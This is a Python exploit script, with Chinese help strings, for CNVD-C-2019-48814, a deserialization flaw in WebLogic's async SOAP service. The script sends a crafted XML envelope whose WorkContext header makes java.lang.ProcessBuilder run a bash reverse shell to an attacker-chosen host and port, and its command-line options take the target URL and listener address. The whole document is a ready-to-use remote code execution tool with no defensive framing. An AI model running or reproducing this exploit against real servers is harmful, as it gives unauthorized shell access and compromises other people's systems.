# -*- coding: utf-8 -*-

import requests
import argparse
class Exploit:
	def __init__(self, rhost, lport, lhost):
		self.url=rhost
		self.lhost=lhost
		self.lport=lport
	def run(self):
		headers={
			'User-Agent' : 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
			'Content-Type' : 'text/xml'
		}
		xml='''
		<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
		<soapenv:Header> 
		<wsa:Action>xx</wsa:Action>
		<wsa:RelatesTo>xx</wsa:RelatesTo>
		<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		<void class="java.lang.ProcessBuilder">
		<array class="java.lang.String" length="3">
		<void index="0">
		<string>/bin/bash</string>
		</void>
		<void index="1">
		<string>-c</string>
		</void>
		<void index="2">
		<string>bash -i &gt;&amp; /dev/tcp/{lhost}/{lport} 0&gt;&amp;1</string>
		</void>
		</array>
		<void method="start"/></void>
		</work:WorkContext>
		</soapenv:Header>
		<soapenv:Body>
		<asy:onAsyncDelivery/>
		</soapenv:Body></soapenv:Envelope>
		'''
		xml=xml.format(lhost=self.lhost,lport=self.lport)
		r=requests.post(self.url+"/_async/AsyncResponseService", data=xml, headers=headers)
		print "执行成功{url}".format(url=self.url)
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CNVD-C-2019-48814利用工具')
    parser.add_argument(
        '-l',
        '--lhost',
        required=True,
        dest='lhost',
        nargs='?',
        help='监听ip')
    parser.add_argument(
        '-p',
        '--lport',
        required=True,
        dest='lport',
        nargs='?',
        help='监听端口')
    parser.add_argument(
        '-r',
        '--rhost',
        required=True,
        dest='rhost',
        nargs='?',
        help='CNVD-C-2019-48814漏洞存在的url')
    args = parser.parse_args()
    exploit = Exploit(
        rhost=args.rhost,lport=args.lport,lhost=args.lhost)
    exploit.run()
